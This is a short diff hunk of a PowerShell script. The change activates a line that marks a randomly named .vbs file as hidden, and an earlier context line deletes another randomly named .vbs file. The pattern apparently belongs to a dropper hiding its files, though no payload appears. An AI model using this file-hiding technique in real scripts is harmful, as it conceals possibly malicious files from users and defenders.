@@ -192,7 +192,7 @@ Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
 #mkdir $initial_dir\esSDyVlwHITj
 
-#Set-ItemProperty -Path "$initial_dir\esSDyVlwHITj" -Name Attributes -Value "Hidden"
+Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"
 
 #attrib +h "initial_dir\esSDyVlwHITj"
 
